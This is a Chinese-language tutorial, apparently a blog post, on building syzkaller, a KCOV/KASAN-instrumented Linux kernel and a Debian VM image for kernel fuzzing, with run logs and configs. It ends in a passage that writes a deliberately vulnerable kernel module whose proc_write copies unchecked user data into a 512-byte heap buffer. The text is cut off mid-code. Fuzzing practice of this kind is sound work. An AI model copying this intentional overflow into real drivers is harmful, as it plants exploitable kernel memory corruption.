github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; -o ./bin/syz-prog2c github.com/google/syzkaller/tools/syz-prog2c GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; -o ./bin/syz-db github.com/google/syzkaller/tools/syz-db GOOS=linux GOARCH=amd64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; -o ./bin/syz-upgrade github.com/google/syzkaller/tools/syz-upgrade GOOS=linux GOARCH=arm64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; &quot;-tags=syz_target syz_os_linux syz_arch_arm64 &quot; -o ./bin/linux_arm64/syz-fuzzer github.com/google/syzkaller/syz-fuzzer GOOS=linux GOARCH=arm64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; &quot;-tags=syz_target syz_os_linux syz_arch_arm64 &quot; -o ./bin/linux_arm64/syz-execprog github.com/google/syzkaller/tools/syz-execprog GOOS=linux GOARCH=arm64 go build &quot;-ldflags=-s -w -X github.com/google/syzkaller/prog.GitRevision=6a383ecfb767c80c9fa63c7708b25e568a4ebfec -X 'github.com/google/syzkaller/prog.gitRevisionDate=20210325-083211'&quot; &quot;-tags=syz_target syz_os_linux syz_arch_arm64 &quot; -o ./bin/linux_arm64/syz-stress github.com/google/syzkaller/tools/syz-stress mkdir -p ./bin/linux_arm64 aarch64-linux-gnu-gcc -o ./bin/linux_arm64/syz-executor executor/executor.cc \\ -O2 -pthread -Wall -Werror -Wparentheses -Wunused-const-variable -Wframe-larger-than=16384 -static -DGOOS_linux=1 -DGOARCH_arm64=1 \\ -DHOSTGOOS_linux=1 -DGIT_REVISION=\\&quot;6a383ecfb767c80c9fa63c7708b25e568a4ebfec\\&quot; # 编译结果 ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ ls bin linux_amd64 linux_arm64 syz-db syz-manager syz-mutate syz-prog2c syz-repro syz-runtest syz-sysgen syz-upgrade ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller$ ls bin/linux_arm64/ syz-execprog syz-executor syz-fuzzer syz-stress # Android-32位 # make TARGETOS=linux TARGETARCH=arm 2 Linux Kernel - Amd64 2.1 拉取linux代码 ztree@ubuntu2:~/fuzz/kernel$ git clone https://mirrors.tuna.tsinghua.edu.cn/git/linux.git ztree@ubuntu2:~/fuzz/kernel$ cd linux/ 2.2 生成默认的内核配置文件 使用/usr/bin/gcc作为编译器，生成默认的内核配置文件（也称为defconfig），该配置文件包含了系统中已经支持的硬件设备和选项。 make CC=&quot;/usr/bin/gcc&quot; defconfig CC=&quot;/usr/bin/gcc&quot;用于指定GCC编译器的路径。这是因为编译内核时需要使用编译器来生成可执行代码。通过指定GCC编译器的路径，可以确保使用特定的编译器进行编译。 生成defconfig文件的主要目的是为了提供一个默认的配置文件.config，方便用户快速开始使用。.config文件中包含了一组默认的配置选项，这些选项通常是在大多数情况下都适用的。 在生成defconfig文件时，会根据一些常见的配置选项和硬件支持信息自动生成一个默认的配置文件。然后，用户可以根据自己的需要选择是否更改这些配置选项。 看一下执行效果： # 执行前，没有.config文件 ztree@ubuntu2:~/fuzz/kernel/linux$ ls -a | grep config .cocciconfig Kconfig # 执行，生成默认配置文件 ztree@ubuntu2:~/fuzz/kernel/linux$ make CC=&quot;/usr/bin/gcc&quot; defconfig HOSTCC scripts/basic/fixdep HOSTCC scripts/kconfig/conf.o HOSTCC scripts/kconfig/confdata.o HOSTCC scripts/kconfig/expr.o LEX scripts/kconfig/lexer.lex.c YACC scripts/kconfig/parser.tab.[ch] HOSTCC scripts/kconfig/lexer.lex.o HOSTCC scripts/kconfig/menu.o HOSTCC scripts/kconfig/parser.tab.o HOSTCC scripts/kconfig/preprocess.o HOSTCC scripts/kconfig/symbol.o HOSTCC scripts/kconfig/util.o HOSTLD scripts/kconfig/conf *** Default configuration is based on 'x86_64_defconfig' # # configuration written to .config # # 执行后，有.config文件 ztree@ubuntu2:~/fuzz/kernel/linux$ ls -a | grep config .cocciconfig .config Kconfig 2.3 基于默认配置文件合并kvm_guest.config 下面的输出很明显地说明了这条命令的作用，使用.config作为基础，合并kvm_guest.config文件，然后将结果写入.config作为最终的内核配置文件。kvm_guest.config是一种特殊的配置文件，用于构建适用于KVM虚拟机的内核。 ztree@ubuntu2:~/fuzz/kernel/linux$ make CC=&quot;/usr/bin/gcc&quot; kvm_guest.config Using .config as base Merging ./kernel/configs/kvm_guest.config # # merged configuration written to .config (needs make) # # # configuration written to .config # kvm_guest.config作为内核配置文件并不是所有情况下都适用的。它是专门为KVM虚拟化环境而设置的，包含了一些针对虚拟化的特定配置选项。这些选项可能与普通的物理机配置有所不同。 通过合并使用配置文件kvm_guest.config，可以确保内核在KVM环境中有更好的性能和兼容性。 2.4 修改配置文件.config vim .config ### 在.config中添加以下内容： # 启用内核代码覆盖率检测功能。通过在内核代码中插入特殊的探针来确定哪些代码路径已执行，以便测试覆盖率 CONFIG_KCOV=y # must # 启用内核调试信息。编译内核时将生成额外的调试信息，这些信息可用于调试内核问题 CONFIG_DEBUG_INFO=y # Memory bug detector # 启用KASAN，用于检测内核地址访问错误，可以检测越界访问、UAF等 CONFIG_KASAN=y # 指定KASAN代码是否内联到内核中。将其设置为y可以使内核更小更快，但KASAN报告的堆栈跟踪可能不完整 CONFIG_KASAN_INLINE=y # Code coverage works better when KASLR Is disabled # CONFIG_RANDOMIZE_BASE is not set # 可选 # 指定要覆盖的代码范围。设置为y时，将覆盖内核所有函数。否则，只覆盖具有适当注释的函数。 CONFIG_KCOV_INSTRUMENT_ALL=y # 启用KCOV比较功能。当设置为y时，将记录if语句的结果是否为真。 CONFIG_KCOV_ENABLE_COMPARISONS=y # 启用内核调试文件系统（debugfs）。它提供了一种向内核发送调试信息的机制，例如通过读写特定文件进行调试和监视。 CONFIG_DEBUG_FS=y # 启用内核内存泄漏检测器（Kernel Memory Leak Detector）。它可以检测到内核中未释放的内存分配。 CONFIG_DEBUG_KMEMLEAK=y # 需要配置以下两个，否则后面fuzz 启动的时候可能出现文件系统的挂载错误 # 启用Linux内核中的ConfigFS文件系统。ConfigFS是一个用于动态配置和调整Linux内核中各种配置项的文件系统，它允许用户通过文件系统接口来访问和修改内核中的配置信息。 CONFIG_CONFIGFS_FS=y # 启用Linux内核中的SecurityFS文件系统。SecurityFS是一个用于安全模块管理的文件系统，它允许安全模块向用户空间提供安全策略、状态和控制信息。通过SecurityFS，安全模块可以将相关信息和接口暴露给用户空间进&gt;行管理和配置。 CONFIG_SECURITYFS=y 2.5 确认修改后的.config和内核源代码树中的配置选项是匹配的 make oldconfig是Linux内核的一个Makefile目标命令，其作用是使用当前配置文件更新内核源代码树中的新配置选项。 当我们需要升级或更改内核版本时，新版本的内核可能会引入一些新的配置选项，这些配置选项在原有的配置文件中是不存在的。如果我们直接使用旧版本的配置文件去编译新版本的内核，编译过程中会报错，因为找不到这些新的配置选项。 make oldconfig的作用就是解决这个问题，它会使用当前配置文件中的配置选项去更新内核源代码树中的新配置选项，使得编译过程能够顺利进行。在更新过程中，会提示用户输入新配置选项的值，并将其添加到配置文件中。 总结来说，make oldconfig的作用就是将当前配置文件与新版本的内核源代码进行对比，并将新版本的配置选项添加到配置文件中，以保持配置文件的最新状态，使得编译过程能够成功进行。 ztree@ubuntu2:~/fuzz/kernel/linux$ make CC=&quot;/usr/bin/gcc&quot; olddefconfig .config:5179:warning: override: reassigning to symbol KCOV .config:5185:warning: override: reassigning to symbol KASAN .config:5189:warning: override: reassigning to symbol RANDOMIZE_BASE .config:5194:warning: override: reassigning to symbol DEBUG_FS .config:5196:warning: override: reassigning to symbol DEBUG_KMEMLEAK .config:5199:warning: override: reassigning to symbol CONFIGFS_FS .config:5201:warning: override: reassigning to symbol SECURITYFS # # configuration written to .config # 上面执行的结果中有一些warning，这些warning是无关紧要的。出现的原因是.config中，这些配置选项本来是用注释表示其未设置，比如： # CONFIG_KCOV is not set 然后步骤2.4修改的时候，我是直接将新的配置拷贝到文件末尾。当执行完make oldconfig后，删掉了这些注释，并将新增的配置选项移动到了之前相应的注释那里。因为.config里所有配置选项是分块存放的，这样会方便查看。 # # Kernel Testing and Coverage # # CONFIG_KUNIT is not set ...... CONFIG_KCOV=y 当然，如果你将新配置放在.config的开头，那么需要将原来相应的注释给删掉，否则新配置不会生效，因为被后面相应的注释给rewrite了。 2.6 开始编译Linux内核 ztree@ubuntu2:~/fuzz/kernel/linux$ make CC=&quot;/usr/bin/gcc&quot; -j16 ...... BUILD arch/x86/boot/bzImage Kernel: arch/x86/boot/bzImage is ready (#1) 2.7 构建文件系统镜像 下载sh脚本：create-image.sh，该脚本会借助 debootstrap 构建文件系统镜像。而debootstrap在1.1安装软件依赖的时候已经安装好了。 # 下载脚本 ztree@ubuntu2:~/fuzz/kernel/linux/image$ wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh --2023-06-30 00:57:05-- https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 0.0.0.0, :: Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|0.0.0.0|:443... failed: Connection refused. Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|::|:443... failed: Connection refused. # 下载失败，进网页拷贝内容到create-image.sh # 修改权限 ztree@ubuntu2:~/fuzz/kernel/linux/image$ chmod +x create-image.sh # 构建文件系统镜像 ztree@ubuntu2:~/fuzz/kernel/linux/image$ ./create-image.sh ...... Allocating group tables: done Writing inode tables: done Creating journal (16384 blocks): done Writing superblocks and filesystem accounting information: done + sudo mkdir -p /mnt/chroot + sudo mount -o loop bullseye.img /mnt/chroot + sudo cp -a chroot/. /mnt/chroot/. + sudo umount /mnt/chroot # 查看构建结果 ztree@ubuntu2:~/fuzz/kernel/linux/image$ ls bullseye.id_rsa bullseye.id_rsa.pub bullseye.img chroot create-image.sh debootstrap是一个基于Debian的工具，用于从已有的Debian系统中创建一个基本的Debian系统环境。它用于在一个新的、空的文件系统上进行安装，可以用于创建一个完整的Debian环境，或者用于创建chroot环境。debootstrap是Debian Installer的一个组件，可以通过命令行进行操作，并根据指定的参数下载并安装Debian软件包。它提供了一个简单的方法来创建一个简洁、最小的Debian系统，以及一个可定制的环境。可以通过debootstrap来创建不同版本的Debian系统，包括stable、testing、unstable等。 2.8 运行syzkaller # 创建一个工作目录 ztree@ubuntu2:~/fuzz/kernel$ mkdir syzkaller-workdir 下面介绍两种运行syzkaller的方法： 2.8.1 isolated模式 isolated模式需要先启动 qemu，然后再连过去。启动qemu的命令如下： qemu-system-x86_64 \\ -kernel /home/ztree/fuzz/kernel/linux/arch/x86/boot/bzImage \\ -append &quot;console=ttyS0 root=/dev/sda debug earlyprintk=serial slub_debug=QUZ&quot;\\ -hda /home/ztree/fuzz/kernel/linux/image/bullseye.img \\ -net user,hostfwd=tcp::10021-:22 -net nic \\ -enable-kvm \\ -nographic \\ -m 2560M \\ -smp 2 \\ -pidfile vm.pid \\ 2&gt;&amp;1 | tee vm.log 有一个Error： [FAILED] Failed to start Raise network interfaces. See 'systemctl status networking.service' for details. 参考：https://github.com/google/syzkaller/blob/master/docs/linux/troubleshooting.md 解决办法有两个： 将以下两行添加到Kernel的配置文件.config中，重新编译Linux内核 CONFIG_CMDLINE_BOOL=y CONFIG_CMDLINE=&quot;net.ifnames=0&quot; 当用qemu模式的时候，在syzkaller manager的配置文件中，在VM的属性里添加以下一行，具体的例子见下一小节。 &quot;cmdline&quot;: &quot;net.ifnames=0&quot; 再次运行，nice，没报Error了，最后显示： ...... Debian GNU/Linux 11 syzkaller ttyS0 syzkaller login: 输入root，显示： Debian GNU/Linux 11 syzkaller ttyS0 syzkaller login: root Linux syzkaller 6.4.0-04247-g3a8a670eeeaa #2 SMP PREEMPT_DYNAMIC Sat Jul 1 23:58:09 CST 2023 x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. A valid context for root could not be obtained. Last login: Sat Jul 1 14:48:25 UTC 2023 on ttyS0 root@syzkaller:~# 另开一个窗口，宿主机ssh连接 ztree@ubuntu2:~$ ssh -i /home/lzx/fuzz/kernel/linux/image/bullseye.id_rsa -p 10021 -o &quot;StrictHostKeyChecking no&quot; root@syzkaller 连接成功： ztree@ubuntu2:~$ ssh -i ~/fuzz/kernel/linux/image/bullseye.id_rsa -p 10021 -o &quot;StrictHostKeyChecking no&quot; root@localhost Warning: Permanently added '[localhost]:10021' (ED25519) to the list of known hosts. Linux syzkaller 6.4.0-04247-g3a8a670eeeaa #2 SMP PREEMPT_DYNAMIC Sat Jul 1 23:58:09 CST 2023 x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. A valid context for root could not be obtained. Last login: Sat Jul 1 16:00:24 2023 root@syzkaller:~# ls root@syzkaller:~# id uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:kernel_t:s0 如果显示宿主机ssh连接不上虚拟机，则需要在 /etc/hosts.allow中加上一句 sshd: ALL 关虚拟机：虚拟机内执行命令poweroff，或者宿主机执行命令kill $(cat vm.pid) 给vm建立一个工作目录 ztree@ubuntu2:~/fuzz/kernel$ mkdir vm-workdir 接着，编写syzkaller manager的配置文件： ztree@ubuntu2:~/fuzz/kernel/syzkaller-workdir$ vim test-isolated.cfg { &quot;target&quot;: &quot;linux/amd64&quot;, &quot;http&quot;: &quot;127.0.0.1:56741&quot;, &quot;rpc&quot;: &quot;127.0.0.1:0&quot;, &quot;workdir&quot;: &quot;/home/ztree/fuzz/kernel/syzkaller-workdir&quot;, &quot;kernel_obj&quot;: &quot;/home/ztree/fuzz/kernel/linux&quot;, &quot;image&quot;: &quot;/home/ztree/fuzz/kernel/linux/image/bullseye.img&quot;, &quot;sshkey&quot;: &quot;/home/ztree/fuzz/kernel/linux/image/bullseye.id_rsa&quot;, &quot;syzkaller&quot;: &quot;/home/ztree/fuzz/kernel/gopath/github.com/google/syzkaller&quot;, &quot;sandbox&quot;: &quot;setuid&quot;, &quot;procs&quot;: 8, &quot;type&quot;: &quot;isolated&quot;, &quot;vm&quot;: { &quot;targets&quot; : [ &quot;127.0.0.1:10021&quot; ], &quot;pstore&quot;: false, &quot;target_dir&quot; : &quot;/home/ztree/fuzz/kernel/vm-workdir&quot;, &quot;target_reboot&quot; : false } } vm的属性target_dir代表虚拟机的工作目录。该目录用于存储各种与虚拟机相关的文件，例如内核映像、内核配置文件、文件系统映像等。 运行成功： ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller/bin$ ./syz-manager -config=/home/ztree/fuzz/kernel/syzkaller-workdir/test-isolated.cfg 2023/07/02 00:19:41 loading corpus... 2023/07/02 00:19:41 serving http on http://127.0.0.1:56741 2023/07/02 00:19:41 serving rpc on tcp://127.0.0.1:40457 2023/07/02 00:19:41 booting test machines... 2023/07/02 00:19:41 wait for the connection from test machine... 2023/07/02 00:20:07 machine check: 2023/07/02 00:20:07 syscalls : 1757/4124 2023/07/02 00:20:07 code coverage : enabled 2023/07/02 00:20:07 comparison tracing : enabled 2023/07/02 00:20:07 extra coverage : enabled 2023/07/02 00:20:07 setuid sandbox : enabled 2023/07/02 00:20:07 namespace sandbox : /proc/self/ns/user does not exist 2023/07/02 00:20:07 Android sandbox : enabled 2023/07/02 00:20:07 fault injection : CONFIG_FAULT_INJECTION is not enabled 2023/07/02 00:20:07 leak checking : enabled 2023/07/02 00:20:07 net packet injection : /dev/net/tun does not exist 2023/07/02 00:20:07 net device setup : enabled 2023/07/02 00:20:07 concurrency sanitizer : /sys/kernel/debug/kcsan does not exist 2023/07/02 00:20:07 devlink PCI setup : PCI device 0000:00:10.0 is not available 2023/07/02 00:20:07 USB emulation : /dev/raw-gadget does not exist 2023/07/02 00:20:07 hci packet injection : /dev/vhci does not exist 2023/07/02 00:20:07 wifi device emulation : /sys/class/mac80211_hwsim/ does not exist 2023/07/02 00:20:07 802.15.4 emulation : /sys/bus/platform/devices/mac802154_hwsim does not exist 2023/07/02 00:20:07 corpus : 36 (deleted 0 broken) 2023/07/02 00:20:08 seeds : 18/683 2023/07/02 00:20:11 VMs 1, executed 2, cover 0, signal 0/0, crashes 0, repro 0 2023/07/02 00:20:21 VMs 1, executed 8, cover 0, signal 0/0, crashes 0, repro 0 2023/07/02 00:20:31 VMs 1, executed 450, cover 11255, signal 13405/13916, crashes 0, repro 0 2023/07/02 00:20:41 VMs 1, executed 489, cover 11261, signal 13450/14022, crashes 0, repro 0 2023/07/02 00:20:51 VMs 1, executed 520, cover 11261, signal 13450/14065, crashes 0, repro 0 2.8.2 qemu模式 这种模式不需要先启动qemu，创建好配置文件后，直接执行syz-manager就ok了。在工作目录下创建一个syzkaller的配置文件： { &quot;target&quot;: &quot;linux/amd64&quot;, &quot;http&quot;: &quot;127.0.0.1:56741&quot;, &quot;workdir&quot;: &quot;/home/ztree/fuzz/kernel/syzkaller-workdir&quot;, &quot;kernel_obj&quot;: &quot;/home/ztree/fuzz/kernel/linux&quot;, &quot;image&quot;: &quot;/home/ztree/fuzz/kernel/linux/image/bullseye.img&quot;, &quot;sshkey&quot;: &quot;/home/ztree/fuzz/kernel/linux/image/bullseye.id_rsa&quot;, &quot;syzkaller&quot;: &quot;/home/ztree/fuzz/kernel/gopath/github.com/google/syzkaller&quot;, &quot;procs&quot;: 8, &quot;type&quot;: &quot;qemu&quot;, &quot;enable_syscalls&quot;: [ &quot;open$proc&quot;, &quot;read$proc&quot;, &quot;write$proc&quot;, &quot;close$proc&quot; ], &quot;vm&quot;: { &quot;count&quot;: 4, &quot;kernel&quot;: &quot;/home/ztree/fuzz/kernel/linux/arch/x86/boot/bzImage&quot;, &quot;cpu&quot;: 2, &quot;mem&quot;: 2048, &quot;cmdline&quot;: &quot;net.ifnames=0&quot;, &quot;qemu_args&quot;:&quot;-enable-kvm&quot; } } 接着运行syzkaller: ztree@ubuntu2:~/fuzz/kernel/gopath/github.com/google/syzkaller/bin$ ./syz-manager -config=/home/ztree/fuzz/kernel/syzkaller-workdir/test.cfg 2023/07/01 22:51:12 loading corpus... 2023/07/01 22:51:12 serving http on http://127.0.0.1:56741 2023/07/01 22:51:12 serving rpc on tcp://[::]:40619 2023/07/01 22:51:12 booting test machines... 2023/07/01 22:51:12 wait for the connection from test machine... 2023/07/01 22:51:42 machine check: 2023/07/01 22:51:42 syscalls : 1961/4124 2023/07/01 22:51:42 code coverage : enabled 2023/07/01 22:51:42 comparison tracing : enabled 2023/07/01 22:51:42 extra coverage : enabled 2023/07/01 22:51:42 setuid sandbox : enabled 2023/07/01 22:51:42 namespace sandbox : /proc/self/ns/user does not exist 2023/07/01 22:51:42 Android sandbox : enabled 2023/07/01 22:51:42 fault injection : CONFIG_FAULT_INJECTION is not enabled 2023/07/01 22:51:42 leak checking : enabled 2023/07/01 22:51:42 net packet injection : /dev/net/tun does not exist 2023/07/01 22:51:42 net device setup : enabled 2023/07/01 22:51:42 concurrency sanitizer : /sys/kernel/debug/kcsan does not exist 2023/07/01 22:51:42 devlink PCI setup : PCI device 0000:00:10.0 is not available 2023/07/01 22:51:42 USB emulation : /dev/raw-gadget does not exist 2023/07/01 22:51:42 hci packet injection : /dev/vhci does not exist 2023/07/01 22:51:42 wifi device emulation : /sys/class/mac80211_hwsim/ does not exist 2023/07/01 22:51:42 802.15.4 emulation : /sys/bus/platform/devices/mac802154_hwsim does not exist 2023/07/01 22:51:42 corpus : 0 (deleted 0 broken) 2023/07/01 22:51:43 seeds : 162/683 2023/07/01 22:51:52 VMs 3, executed 8, cover 0, signal 0/0, crashes 0, repro 0 2023/07/01 22:52:02 VMs 4, executed 24, cover 0, signal 0/0, crashes 0, repro 0 2023/07/01 22:52:12 VMs 4, executed 443, cover 14018, signal 16936/17461, crashes 0, repro 0 2023/07/01 22:52:22 VMs 4, executed 866, cover 16119, signal 20305/20423, crashes 0, repro 0 2023/07/01 22:52:32 VMs 4, executed 890, cover 16232, signal 20354/20558, crashes 0, repro 0 2023/07/01 22:52:42 VMs 4, executed 923, cover 16233, signal 20486/22089, crashes 0, repro 0 2023/07/01 22:52:52 VMs 4, executed 972, cover 16233, signal 20489/22476, crashes 0, repro 0 2023/07/01 22:53:02 VMs 4, executed 1032, cover 16264, signal 20529/23384, crashes 0, repro 0 2023/07/01 22:53:12 VMs 4, executed 1083, cover 16264, signal 20529/23471, crashes 0, repro 0 2023/07/01 22:53:22 VMs 4, executed 1176, cover 16264, signal 20543/23767, crashes 0, repro 0 2023/07/01 22:53:32 VMs 4, executed 1193, cover 16350, signal 20653/23875, crashes 0, repro 0 2023/07/01 22:53:42 VMs 4, executed 1282, cover 16948, signal 21334/23911, crashes 0, repro 0 2023/07/01 22:53:52 VMs 4, executed 1327, cover 16963, signal 21362/23972, crashes 0, repro 0 2023/07/01 22:54:02 VMs 4, executed 1387, cover 16965, signal 21390/24070, crashes 0, repro 0 2023/07/01 22:54:12 VMs 4, executed 1431, cover 16987, signal 21437/24098, crashes 0, repro 0 然后浏览器输入http://127.0.0.1:56741就可以访问syz-manager了： 2.9 例子 - fuzz驱动 2.9.1 编译一个带漏洞的驱动 参考这两篇文章： https://github.com/hardenedlinux/Debian-GNU-Linux-Profiles/blob/master/docs/harbian_qa/fuzz_testing/test.c https://bbs.kanxue.com/thread-265405.htm#msg_header_h1_5 因为之前下载的是master分支，所以先看看这是啥版本： ztree@ubuntu2:~/fuzz/kernel/linux$ git describe --tags v6.4-4247-g3a8a670eeeaa ztree@ubuntu2:~/fuzz/kernel/linux$ make kernelversion 6.4.0 准备编译环境，编译需要头文件的支持： ztree@ubuntu2:~/fuzz/kernel/test$ mkdir 6.4.0 ztree@ubuntu2:~/fuzz/kernel/test$ cd 6.4.0/ ztree@ubuntu2:~/fuzz/kernel/test/6.4.0$ mkdir kernel ztree@ubuntu2:~/fuzz/kernel/test/6.4.0$ ln -s /home/ztree/fuzz/kernel/linux ./source ztree@ubuntu2:~/fuzz/kernel/test/6.4.0$ ln -s /home/ztree/fuzz/kernel/linux ./build ztree@ubuntu2:~/fuzz/kernel/test/6.4.0$ ll total 12 drwxrwxr-x 3 ztree ztree 4096 7月 3 23:19 ./ drwxrwxr-x 3 ztree ztree 4096 7月 3 23:16 ../ lrwxrwxrwx 1 ztree ztree 29 7月 3 23:19 build -&gt; /home/ztree/fuzz/kernel/linux/ drwxrwxr-x 2 ztree ztree 4096 7月 3 23:16 kernel/ lrwxrwxrwx 1 ztree ztree 29 7月 3 23:19 source -&gt; /home/ztree/fuzz/kernel/linux/ 然后创建含有漏洞的代码文件： ztree@ubuntu2:~/fuzz/kernel$ mkdir test ztree@ubuntu2:~/fuzz/kernel$ cd test ztree@ubuntu2:~/fuzz/kernel/test$ vim test.c ztree@ubuntu2:~/fuzz/kernel/test$ vim Makefile test.c如下： #include &lt;linux/init.h&gt; #include &lt;linux/module.h&gt; #include &lt;linux/proc_fs.h&gt; #include &lt;linux/uaccess.h&gt; #include &lt;linux/slab.h&gt; #define MY_DEV_NAME &quot;test&quot; #define DEBUG_FLAG &quot;PROC_DEV&quot; static ssize_t proc_read (struct file *proc_file, char __user *proc_user, size_t n, loff_t *loff); static ssize_t proc_write (struct file *proc_file, const char __user *proc_user, size_t n, loff_t *loff); static int proc_open (struct inode *proc_inode, struct file *proc_file); static struct file_operations a = { .open = proc_open, .read = proc_read, .write = proc_write, }; static int __init mod_init(void) { struct proc_dir_entry *test_entry; const struct file_operations *proc_fops = &amp;a; printk(DEBUG_FLAG&quot;:proc init start!\\n&quot;); test_entry = proc_create(MY_DEV_NAME, S_IRUGO|S_IWUGO, NULL, proc_fops); if(!test_entry) printk(DEBUG_FLAG&quot;:there is somethings wrong!\\n&quot;); printk(DEBUG_FLAG&quot;:proc init over!\\n&quot;); return 0; } static ssize_t proc_read (struct file *proc_file, char __user *proc_user, size_t n, loff_t *loff) { printk(DEBUG_FLAG&quot;:finish copy_from_use,the string of newbuf is&quot;); return 0; } static ssize_t proc_write (struct file *proc_file, const char __user *proc_user, size_t n, loff_t *loff) { char *c = kmalloc(512, GFP_KERNEL); copy_from_user(c, proc_user, 4096); // 很明显的堆溢出 printk(DEBUG_FLAG&quot;:into write!\\n&quot;); return 0; } int proc_open (struct inode *proc_inode, struct file *proc_file) { printk(DEBUG_FLAG&quot;:into open!\\n&quot;); return 0; } module_init(mod_init); Makefile如下： # Linux内核配置选项，用于启用或禁用内核模块的数字签名验证功能。当配置为y时，表示启用数字签名验证；当配置为n时，表示禁用数字签名验证。数字签名验证可以验证加载的内核模块是否经过数字签名认证，以确保模块的完整性和安全性。启用数字签名验证可以增强系统的安全性，防止恶意或未经授权的模块加载到内核中。 CONFIG_MODULE_SIG=n obj-m += test.o EXTRA_CFLAGS += -fno-stack-protector -no-pie all: make -C /home/ztree/fuzz/kernel/test/6.4.0/build M=$(PWD) modules clean: rm -rf *.ko rm -rf *.mod rm -rf *.mod.* rm -rf *.o rm .tmp_versions/test.mod rm .test.ko.cmd rm .test.mod.o.cmd rm .test.o.cmd rm Module.symvers rm modules.order 注意：Makefile中使用Tab作为前导空白字符，而不是空格。否则会报错：*** missing separator. Stop ztree@ubuntu2:~/fuzz/kernel/test$ make make -C /home/ztree/fuzz/kernel/test/6.4.0/build M=/home/ztree/fuzz/kernel/test modules make[1]: Entering directory '/home/ztree/fuzz/kernel/linux' CC [M] /home/ztree/fuzz/kernel/test/test.o /home/ztree/fuzz/kernel/test/test.c: In function ‘mod_init’: /home/ztree/fuzz/kernel/test/test.c:26:66: error: passing argument 4 of ‘proc_create’ from incompatible pointer type [-Werror=incompatible-pointer-types] 26 | test_entry = proc_create(MY_DEV_NAME, S_IRUGO|S_IWUGO, NULL, proc_fops); | ^~~~~~~~~ | | | const struct file_operations * In file included from /home/ztree/fuzz/kernel/test/test.c:3: ./include/linux/proc_fs.h:110:122: note: expected ‘const struct proc_ops *’ but argument is of type ‘const struct file_operations *’ 110 | struct proc_dir_entry *proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent, const struct proc_ops *proc_ops); | ~~~~~~~~~~~~~~~~~~~~~~~^~~~~~~~ /home/ztree/fuzz/kernel/test/test.c: In function ‘proc_write’: /home/ztree/fuzz/kernel/test/test.c:45:5: error: ignoring return value of ‘copy_from_user’ declared with attribute ‘warn_unused_result’ [-Werror=unused-result] 45 | copy_from_user(c, proc_user, 4096); | ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ In file included from ./arch/x86/include/asm/preempt.h:9, from ./include/linux/preempt.h:78, from ./include/linux/spinlock.h:56, from ./include/linux/kref.h:16, from ./include/linux/mm_types.h:8, from ./include/linux/buildid.h:5, from ./include/linux/module.h:14, from /home/ztree/fuzz/kernel/test/test.c:2: In function ‘check_copy_size’, inlined from ‘copy_from_user’ at ./include/linux/uaccess.h:182:6, inlined from ‘proc_write’ at /home/ztree/fuzz/kernel/test/test.c:45:5: ./include/linux/thread_info.h:246:25: error: call to ‘__bad_copy_to’ declared with attribute error: copy destination size is too small 246 | __bad_copy_to(); | ^~~~~~~~~~~~~~~ cc1: all warnings being treated as errors make[2]: *** [scripts/Makefile.build:252: /home/ztree/fuzz/kernel/test/test.o] Error 1 make[1]: *** [Makefile:2032: /home/ztree/fuzz/kernel/test] Error 2 make[1]: Leaving directory '/home/ztree/fuzz/kernel/linux' make: *** [Makefile:8: all] Error 2 执行make 后，报错如上。 第一个报错：proc_create的最后一个参数要求是 const struct proc_ops * 而不是旧的 const struct file_operations *。 第二个报错：原因是代码中使用了copy_from_user函数，并且默认将其声明为具有warn_unused_result属性。这个属性表示编译器会在发现函数返回值没有被使用时产生一个警告。 所以为了解决这个错误，我们可以获取其返回值进行检查，但更方便的方法是在编译时加入-Wno-error=unused-result参数，该参数告诉编译器将unused-result警告转换为普通的警告，而不是将其视为错误。 第三个报错：编译运行时会检查copy_from_user的参数，检测到了4096明显比destination buffer更大，会发生溢出。hmmm，为什么网上其他的文章都没提这个？ 我的解决办法是把4096换成参数n。不检查n的话也是可能会发生堆溢出的。 最终修改后的test.c如下： #include &lt;linux/init.h&gt; #include &lt;linux/module.h&gt; #include &lt;linux/proc_fs.h&gt; #include &lt;linux/uaccess.h&gt; #include &lt;linux/slab.h&gt; #define MY_DEV_NAME &quot;test&quot; #define DEBUG_FLAG &quot;PROC_DEV&quot; static ssize_t proc_read (struct file *proc_file, char __user *proc_user, size_t n, loff_t *loff); static ssize_t proc_write (struct file *proc_file, const char __user *proc_user, size_t n, loff_t *loff); static int proc_open (struct inode *proc_inode, struct file *proc_file); static struct proc_ops a = { // [1]file_operations -&gt; proc_ops .proc_open = proc_open, // [2] .open -&gt; .proc_open .proc_read = proc_read, // [3] .read -&gt; .proc_read .proc_write = proc_write, //[4] .write -&gt; .proc_write }; static int __init 